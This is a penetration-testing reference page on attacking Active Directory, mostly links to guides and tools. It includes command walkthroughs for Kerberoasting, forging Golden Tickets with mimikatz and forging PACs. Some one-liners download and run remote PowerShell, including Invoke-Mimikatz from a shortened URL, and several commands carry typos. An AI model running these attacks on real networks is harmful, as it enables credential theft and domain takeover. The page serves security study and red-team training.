---
description: Where can we go, once we are in?
---

# Attacking Active Directory

## **AD Guides and Reference**

![](../../.gitbook/assets/Pentestingactivedirectory.png)

* [https://mayfly277.github.io/assets/blog/pentest\_ad\_dark.svg](https://mayfly277.github.io/assets/blog/pentest\_ad\_dark.svg) - Another killer AD Mindmap.

<details>

<summary>Active Directory Basics and Collections</summary>

[https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)&#x20;

* [https://adsecurity.org/](https://adsecurity.org/)
* [https://kvenkatraman10.gitbook.io/ad101/](https://kvenkatraman10.gitbook.io/ad101/)
* [https://activedirectorypro.com/glossary/](https://activedirectorypro.com/glossary/)
* [Infosec\_Reference/Active\_Directory](https://github.com/rmusser01/Infosec\_Reference/blob/master/Draft/Active\_Directory.md)
* [https://github.com/infosecn1nja/AD-Attack-Defense](https://github.com/infosecn1nja/AD-Attack-Defense)
* [AD-security-workshop](https://github.com/wavestone-cdt/AD-security-workshop)
* [AD Security Technical Implementation Guide](https://www.stigviewer.com/stig/active\_directory\_domain/)
* [https://social.technet.microsoft.com/wiki/contents/articles/20964.active-directory-ultimate-reading-collection.aspx](https://social.technet.microsoft.com/wiki/contents/articles/20964.active-directory-ultimate-reading-collection.aspx)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/understanding\_active\_directory/about\_active\_directory/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/understanding\_active\_directory/about\_active\_directory/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/active\_directory\_help\_commands/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/active\_directory\_help\_commands/)

</details>

<details>

<summary>Domain Controllers</summary>

* [https://adsecurity.org/?p=3377](https://adsecurity.org/?p=3377)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/understanding\_active\_directory/domain\_controller/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/understanding\_active\_directory/domain\_controller/)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory](https://adsecurity.org/?p=3592)
* [https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)

</details>

<details>

<summary>Domain Groups</summary>

[https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)

* [https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/](https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)

</details>

<details>

<summary>Group Policy</summary>

[https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\))

* [NIST Hardened GPO checklist](https://ncp.nist.gov/checklist/629/download/7296)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/understanding\_active\_directory/group\_policies/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/understanding\_active\_directory/group\_policies/)

</details>

<details>

<summary>AD Certificate Services</summary>

****[**https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services**](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services)****

* [https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) - PowerShell toolkit for auditing Active Directory Certificate Services (AD CS).
* [Certify](https://github.com/GhostPack/Certify) - Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).
  * [https://specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified\_Pre-Owned.pdf)
  * [Certipy](https://github.com/ollypwn/Certipy) - Python implementation for Certify
  * [https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6?gi=8b97d28018d8](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6?gi=8b97d28018d8)

</details>

<details>

<summary>Kerberos</summary>

[https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)

* [https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html](https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html)
* [https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/](https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/)
* [Kerberos Tickets on Linux Red Teams](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
* [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
* [Kerberos Attacks Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
* [Kerberos cheatsheet](https://gist.github.com/knethteo/2fc8af6ea28199fd63a529a73a4176c7)

</details>

<details>

<summary>Attacking AD</summary>

* [PayloadsAllTheThings/ActiveDirectoryAttack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
* [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
* [Active Directory Exploitation Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)
* [PayloadsAllTheThings/Windows-Usingcredentials](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md)
* [Top 16 Active Directory Vulnerabilities](https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/)
* [Attacking Active Directory: 0 to 0.9 | zer1t0](https://zer1t0.gitlab.io/posts/attacking\_ad/)
* [https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/](https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/)
* [https://www.blackhillsinfosec.com/webcast-weaponizing-active-directory/](https://www.blackhillsinfosec.com/webcast-weaponizing-active-directory/)
* [https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)
* [Tactics, Techniques and Procedures for Attacking Active Directory BlackHat Asia 2019](https://docs.google.com/presentation/d/1j2nW05H-iRz7-FVTRh-LBXQm6M6YIBQNWa4V7tp99YQ/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
* [WadComs - ](https://wadcoms.github.io)WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.

</details>

<details>

<summary>Queries and Commands for Active Directory</summary>

* Get more information about users in AD
  * Manual Queries - Traditional
    * \>net user - enumerates all accounts
    * \>net user /domain - enumerates all accounts in the domain
    * \>net user bob\_admin - enumerate groups the user belongs to
  * Manual queries - Powershell
    * Script that will Enumerate AD users and properties of the accounts
    * \- See PWKv2
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/recon/active\_directory\_recon/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/recon/active\_directory\_recon/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/powershell/activedirectory/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/powershell/activedirectory/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/ldap\_syntax/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/ldap\_syntax/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/powershell/jit\_csharp\_compilation/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/powershell/jit\_csharp\_compilation/)
* _Cyber Operations: Active Directory - pg.235_
* _BTFM: Active Directory Inventory - pg. 16_

</details>

{% content-ref url="../../blue-defense/device-hardening/ad-security-checks.md" %}
[ad-security-checks.md](../../blue-defense/device-hardening/ad-security-checks.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

## [Bloodhound](https://github.com/BloodHoundAD/BloodHound)&#x20;

The Active Directory Mapping tool. Used by Red and Blue teamers to map out their Active Directory environment and look for the shortest path to compromise Domain Admin.

{% tabs %}
{% tab title="Guides and Reference" %}
* [Awesome Lists Collection: Bloodhound](https://github.com/chryzsh/awesome-bloodhound)
* [BloodHound: Six Degrees of Domain Admin — BloodHound 3.0.3 documentation](https://bloodhound.readthedocs.io/en/latest/)&#x20;
* [Title - ERNW\_DogWhispererHandbook.pdf](https://ernw.de/download/BloodHoundWorkshop/ERNW\_DogWhispererHandbook.pdf)&#x20;
* [BloodHound Power Usage - Google Slides](https://docs.google.com/presentation/d/1-fJooJ\_ehGnyrJUHj8G2sGMmSNuYs60P2JWEKnspxng/mobilepresent#slide=id.g35f391192\_00)&#x20;
* [CptJesus | BloodHound: Intro to Cypher](https://blog.cptjesus.com/posts/introtocypher)&#x20;
* [AD Resilience - Oslo 2019 - Google Slides](https://docs.google.com/presentation/d/1RmewetR6mp4ZzDlgPL4wRUmePmEtXUXOWw7ArJ5JGOY/mobilepresent#slide=id.g35f391192\_00)
* [Attack Mapping With Bloodhound](https://blog.stealthbits.com/local-admin-mapping-bloodhound)
* [Hidden Administrative Accounts: BloodHound to the Rescue](https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/)
* [Bloodhound walkthrough. A Tool for Many Tradecrafts](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)
* [Conda's Bloodhound Setup Video](https://www.youtube.com/watch?v=aJqjH3MsbLM\&list=PLDrNMcTNhhYqZj7WZt2GfNhBDqBnhW6AT\&index=3)
* _Operator Handbook: Bloodhound - pg. 4_

__


{% endtab %}

{% tab title="Bloodhound Basics" %}
### Bloodhound Basics

* Uses graph theory to reveal the hidden and unintended relationships in an AD environment.
* Easily identity highly complex attack paths - can be used by defenders ad well.
* Bloodhound works by running an ingestor that queries AD for users, groups and hosts. It will then connect to each system to enumerate logged in users sessions and permissions. \*\*\*WARNING: VERY LOUD\*\*\* There is a stealth option but its limited.
* Two Verisons
  * BloodHound - Powershell based older module&#x20;
  * Sharphound - C# verision that is much faster and stable. Standalone binary or imported as a Powershell script.
    * Script version wil use reflection and assembly.load to load the compiled ingestor into memory
    * &#x20;[https://github.com/BloodhoundAD/BloodHound/tree/master/ingestors](https://github.com/BloodhoundAD/BloodHound/tree/master/ingestors)
* Multiple connection Methods you might need to specify
  * Group - group membership info
  * LocalGroup - Collect local admin info
  * Session - session info
  * SessionLoop - Continuously collection session info until killed
  * Trust - enumerate domain trust data
  * ACL - collect ACL data
  * ComputerOnly - local admin and session data
  * GPOLocalGroup - collects local admin info via group policy objects
  * LoggedOn - Collects session info using privileged methods (needs admin)
  * ObjectProps - collects node property info for users and devices.
  * Default - collects Group membership, local admin,sessions, and domain trusts
* Commands
  * Bloodhound.ps1\[sharphound.ps1] Invoke-Bloodhound -CollectionMethod \[method of choice]
  * \> Sharphound.exe -c \[method of choice]
  * After bloodhound finishes, it will drop the files on the victims system. Pull them on to your machine.
  * Next we need to start our correlation graph using Neo4j server and import the data
    * \# apt-get install bloodhound
    * \# neo4j console
    * Open browser to [http://localhost:7474](http://localhost:7474)
      * connect to bolt://localhost:7687
      * username/pw = neo4j/neo4j
      * CHANGE PASSWORD
  * \# sudo bloodhound
    * Database URL: bolt://127.0.0.1:7687
    * Username: neo4j
    * Password: newpassword
    * Upload data - all the created csv files
  * Neo4j allows for raw queries through its own language called Cypher
    * [https://blog.cptjesus/posts/introtocypher](https://blog.cptjesus/posts/introtocypher)
    * [https://porterhau5.com/blog/extending-bloodhound-track-and-visualize-your-compromise](https://porterhau5.com/blog/extending-bloodhound-track-and-visualize-your-compromise)
    * [https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json](https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json)
  * When using the ACL method, bloodhound will gather all permissions for users/objects
  * The info we gather from Access Control Entries describes allowed and denied permissions for users groups and comps.
  * Bloodhound 1.3 - the ACL attack path Update [https://wald0.com/?p=112](https://wald0.com/?p=112)
  * Introducing the adversary resiliancy methodology [http://bit.ly/2GYU7S7](http://bit.ly/2GYU7S7)
{% endtab %}

{% tab title="Bloodhound Related Tools" %}
* [Bloodhound Enterprise ](https://bloodhoundenterprise.io/)- Enterprise grade attack path management solution
* [BloodHound.py](https://github.com/fox-it/BloodHound.py) - A Python based ingestor for BloodHound
* [Plumhound](https://github.com/PlumHound/PlumHound) - Reporting Engine for bloodhound.
* [SharpHound](https://github.com/BloodHoundAD/SharpHound) - C# version of bloodhound
* [GoodHound](https://github.com/idnahacks/GoodHound) - Uses Sharphound, Bloodhound and Neo4j to produce an actionable list of attack paths for targeted remediation.
* [BadBlood](https://github.com/davidprowe/BadBlood) - BadBlood by Secframe fills a Microsoft Active Directory Domain with a structure and thousands of objects. The output of the tool is a domain similar to a domain in the real world. Used for testing of Bloodhound.
* [aclpwn.py](https://github.com/fox-it/aclpwn.py) - Active Directory ACL exploitation with BloodHound
* [crackhound](https://github.com/trustedsec/crackhound) - CrackHound is a way to introduce plain-text passwords into BloodHound. This allows you to upload all your cracked hashes to the Neo4j database and use it for reporting purposes (csv exports) or path finding in BloodHound using custom queries.
  * [https://www.trustedsec.com/blog/expanding-the-hound-introducing-plaintext-field-to-compromised-accounts/](https://www.trustedsec.com/blog/expanding-the-hound-introducing-plaintext-field-to-compromised-accounts/)
* ****[**GoldenCopy**](https://github.com/Dramelac/GoldenCopy) **-** Copy the properties and groups of a user from neo4j (bloodhound) to create an identical golden ticket.
* [GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application](https://github.com/GoFetchAD/GoFetch)
* [DeathStar - Automate getting Domain Admin using Empire](https://github.com/byt3bl33d3r/DeathStar)
* [ANGRYPUPPY - Bloodhound Attack Path Automation in CobaltStrike](https://github.com/vysec/ANGRYPUPPY)
{% endtab %}

{% tab title="Cypher Queries" %}
* [DogWhisperer - BloodHound Cypher Cheat Sheet (v2)](https://github.com/SadProcessor/Cheats/blob/master/DogWhispererV2.md)
* [Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
* [BloodhoundAD-Queries](https://github.com/Scoubi/BloodhoundAD-Queries)
* [Bloodhound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)&#x20;
{% endtab %}
{% endtabs %}

## **AD Enumeration**

[https://attl4s.github.io/assets/pdf/Understanding\_Active\_Directory\_Enumeration.pdf](https://attl4s.github.io/assets/pdf/Understanding\_Active\_Directory\_Enumeration.pdf)

{% tabs %}
{% tab title="Tools" %}
* [ADExplorer by Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) - An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute.
* [ADRecon](https://github.com/adrecon/ADRecon) - ADRecon is a tool which extracts and combines various artifacts (as highlighted below) out of an AD environment.
* [ACLight](https://github.com/cyberark/ACLight) -A tool for advanced discovery of Privileged Accounts - including Shadow Admins.
* [TruffleSnout](https://github.com/dsnezhkov/TruffleSnout) - Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration.
* [Snaffler](https://github.com/SnaffCon/Snaffler) - It gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.
{% endtab %}

{% tab title="SPN Scanning" %}
* [SPN Scanning – Service Discovery without Network Port Scanning](https://adsecurity.org/?p=1508)
* [Active Directory: PowerShell script to list all SPNs used](https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx)
* [Discovering Service Accounts Without Using Privile](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)
{% endtab %}

{% tab title="Data Mining" %}
* [A Data Hunting Overview](https://thevivi.net/2018/05/23/a-data-hunting-overview/)
* [Push it, Push it Real Good](https://www.harmj0y.net/blog/redteaming/push-it-push-it-real-good/)
* [Finding Sensitive Data on Domain SQL Servers using PowerUpSQL](https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/)
* [Sensitive Data Discovery in Email with MailSniper](https://www.youtube.com/watch?v=ZIOw\_xfqkKM)
* [Remotely Searching for Sensitive Files](https://www.fortynorthsecurity.com/remotely-search/)
* [I Hunt Sysadmins - harmj0](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)y
{% endtab %}

{% tab title="User Hunting" %}
* [Active Directory Recon Without Admin Rights](https://adsecurity.org/?p=2535)
* [Gathering AD Data with the Active Directory PowerShell Module](https://adsecurity.org/?p=3719)
* [Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode](http://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html)
* [PowerUpSQL Active Directory Recon Functions](https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions)
* [Derivative Local Admin](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
* [Automated Derivative Administrator Search](https://wald0.com/?p=14)
* [Dumping Active Directory Domain Info – with PowerUpSQL!](https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/)
* [Local Group Enumeration](https://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
* [Situational Awareness](https://pentestlab.blog/2018/05/28/situational-awareness/)
* [Commands for Domain Network Compromise](https://www.javelin-networks.com/static/5fcc6e84.pdf)
* [A Pentester’s Guide to Group Scopin](https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)
{% endtab %}

{% tab title="LAPS" %}
* [Microsoft LAPS Security & Active Directory LAPS Configuration Recon](https://adsecurity.org/?p=3164)
* [Running LAPS with PowerView](https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/)
* [RastaMouse LAPS Part 1 & 2](https://rastamouse.me/tags/laps/)
{% endtab %}

{% tab title="ADFS" %}
* [118 Attacking ADFS Endpoints with PowerShell Karl Fosaaen](https://www.youtube.com/watch?v=oTyLdAUjw30)
* [Using PowerShell to Identify Federated Domains](https://blog.netspi.com/using-powershell-identify-federated-domains/)
* [LyncSniper: A tool for penetration testing Skype for Business and Lync deployments](https://github.com/mdsecresearch/LyncSniper)
* [Troopers 19 - I am AD FS and So Can You](https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you)
{% endtab %}
{% endtabs %}

## **AD Exploitation**

{% tabs %}
{% tab title="Tools" %}
### **Credential Harvesting**

* [Red Snarf](https://github.com/nccgroup/redsnarf) - RedSnarf is a pen-testing / red-teaming tool by Ed Williams for retrieving hashes and credentials from Windows workstations, servers and domain controllers using OpSec Safe Techniques
  * [https://www.kali.org/tools/redsnarf/](https://www.kali.org/tools/redsnarf/)
* [AD-006 - Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)

### Exploitation

* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of _large_ Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.
  * [Home · byt3bl33d3r/CrackMapExec Wiki · GitHub](https://github.com/byt3bl33d3r/CrackMapExec/wiki)&#x20;
  * [Introduction - CrackMapExec \~ CME WIKI](https://mpgn.gitbook.io/crackmapexec/)
* [Rubeus](https://github.com/GhostPack/Rubeus) - Rubeus is a C# toolset for raw Kerberos interaction and abuses.
  * [Rubeus-GUI](https://github.com/VbScrub/Rubeus-GUI) - GUI alternative to the Rubeus command line tool, for all your Kerberos exploit requirements
* [ActiveReign](https://github.com/m8r0wn/ActiveReign) - ActiveReign, code name AR3, is a network enumeration and attack toolset designed for use on Windows Active Directory environments.
* [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) - Tool to audit and attack LAPS environments.
* [Powermad](https://github.com/Kevin-Robertson/Powermad) - PowerShell MachineAccountQuota and DNS exploit tools
  * [https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/tools/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/tools/)
{% endtab %}

{% tab title="Impacket Scripts" %}
Impacket scripts

* [GetTGT.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getTGT.py) Given a password, hash or aesKey, this script will request a TGT and save it as ccache.
* [GetST.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getST.py) Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user.
* [GetPac.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getPac.py) This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of \[MS-SFU]'s S4USelf + User to User Kerberos Authentication.
* [GetUserSPNs.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/GetUserSPNs.py) This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
* [GetNPUsers.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/GetNPUsers.py) This example will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF\_DONT\_REQUIRE\_PREAUTH). Output is compatible with JtR.
* [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ticketConverter.py): This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa.
* [ticketer.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ticketer.py) This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC\_LOGON\_INFO structure, in particular the groups, ExtraSids, duration, etc.
* [raiseChild.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/raiseChild.py) This script implements a child-domain to forest privilege escalation
{% endtab %}

{% tab title="Kerberoasting" %}
* [https://room362.com/post/2016/kerberoast-pt1/](https://room362.com/post/2016/kerberoast-pt1/)
* [https://room362.com/post/2016/kerberoast-pt2/](https://room362.com/post/2016/kerberoast-pt2/)
* [https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/kerberoasting/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/kerberoasting/)
* [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
* [https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)
* [https://cobalt.io/blog/kerberoast-attack-techniques](https://cobalt.io/blog/kerberoast-attack-techniques)
* [Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
* [Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain](https://adsecurity.org/?p=2293)
* [Extracting Service Account Passwords With Kerberoasting](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)
* [Cracking Service Account Passwords with Kerberoasting](https://www.cyberark.com/blog/cracking-service-account-passwords-kerberoasting/)
* [Kerberoast PW list for cracking passwords with complexity requirements](https://gist.github.com/edermi/f8b143b11dc020b854178d3809cf91b5)
* [DerbyCon 2019 - Kerberoasting Revisited](https://www.slideshare.net/harmj0y/derbycon-2019-kerberoasting-revisited)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [Conda's Kerberoasting Video](https://www.youtube.com/watch?v=-3MxoxdzFNI\&list=PLDrNMcTNhhYqZj7WZt2GfNhBDqBnhW6AT\&index=5)

Kerberoasting

* Any ticket can be requested by any user with kerberos, from the domain controller
* Those tickets are encrypted with the NTLM hash of the associated service user.
* If we can guess the password to teh associated service user's NTLM hash, then we now know the password to the actual service account
* Steps:
  * &#x20;List all SPN services. These are the service accounts for which we are going to pull all the kerberos tickets
    * \>setspn -T \[domain] -F -Q \*/\*
  * &#x20;Next we target either a single user SPN or pull all the user Kerberos tickets into our user's memory
    * Single target
      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList “HTTP/\[hostname].\[domain].local”
    * All User tickets
      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; IEX (New-Object Net.WebClient).DownloadString("https://githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList $\_.ServicePrincipalName}catch{}
    * &#x20;And the powersploit tool to automate this!
      * [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
    * Now we have our tickets imported into memory and we need to extract them.
      * Mimikatz Kerberoast export:
      * \>powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-Mimikatz -Command ‘’'''''kerberos::list /export'''''''
      * Once extracted and on our victims machine and we can start cracking them!
        * use tgsrepcrack.p
{% endtab %}

{% tab title="Golden Ticket" %}
[AD-001 - Golden Ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)

* Creating your own tickets to Auth to any server
* You can take the old krbtgt hash from the previous hash dump and promote yourself back to Domain admin, all with an unprivileged account
* A few notes on krbtgt:
  * Do not reset the system generated password, it could break the whole domain
  * Even if you change every password for every domain admin, you can still become a DA
  * You can create Users and Groups that do not exist within the Golden ticket
* What you need
  * Domain - on victim host type: whoami
  * Domain Admin user - On victim host type: net local group administrators /DOMAIN
  * Domain SID - whoami /user chop off the last dash and 4 digits
  * krbtgt - From previous hashdump, use the second half of the hash/the NTLM hash
* Process
  * Run Smbexec, choose hashdump, and dump the domain controller
  * A log file will be created with the domain hashes. The one we need is the second part of the krbtgt hash
  * Return to original shell
  * Drop into mimikatz 2.0
    * use kiwi
  * Create golden ticket
    * \>golden\_ticket\_create -u \[domain admin suername] -d \[domain] -k \[krbtgt hash] -s \[Domain SID] -t \[location to Drop Golden Ticket]
* Using the Golden ticket
  * Shell access with limited access
    * \>session -i
  * Load mimikatz
    * \>use kiwi
  * Check current Kerberos Tickets
    * \> kerberos\_ticket\_list
  * Purge all Kerberos Tickets
    * \>kerberos\_ticket\_purge
  * Local our Golden Ticket (stored in /opt/ticekt.txt in our vm)
    * \>kerberos\_ticket\_use /opt/ticket.txt
  * Drop into a shell and read files off the DC
    * \>shell
    * \> dir \ \DC\c$
  * Once we are authed using the Golden ticket, we can send Domain admin commands using WMIC
  * Example: execute a ping commmand and write that to a file on a remote server
    * wmic /authority:"Kerberos:\[attacker.domain] \\\[target hostname]" /node:\[target hostname] process call create "cmd /c ping 127.0.0.1 > C:\log.txt
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Privildge Attribute Cert Vuln" %}
Privilege Attribute Certificate vulnerability

* With basic information on a domain user you can move to a domain admin by editing the PAC
  * \#git clone [https://github.com/bidord/pykek](https://github.com/bidord/pykek) /opt/pykek
  * \# apt-get install krb5-user
  * \# apt-get install rdate
  * \# rdate -n \[domain]
  * \# echo \[attacker IP]\[domain controller hostname] >> /etc/host
* Next we need 4 pieces of information
  * \-u username@domain (user@domain1)
  * \-d domain controller \[domain.controller.test]
  * \-p password
  * \-s SID (get SID with command “whoami /user”
* Now that we have all the pieces
  * \#cd /opt/pykek
  * \#python ms12-068.py -d domain.controller.test -u user@domain1 -s \[SID] -p \[password
* We have created a credential cache ticket and now we copy it where it needs to go
  * \#cp TGT\_user@domain1.ccache /tmp/krb5cc\_0
* Now you have access with
  * \#smclient -k -W domain1 //domain.controller.test/c$ -k
{% endtab %}

{% tab title="Pass-The-Ticket" %}
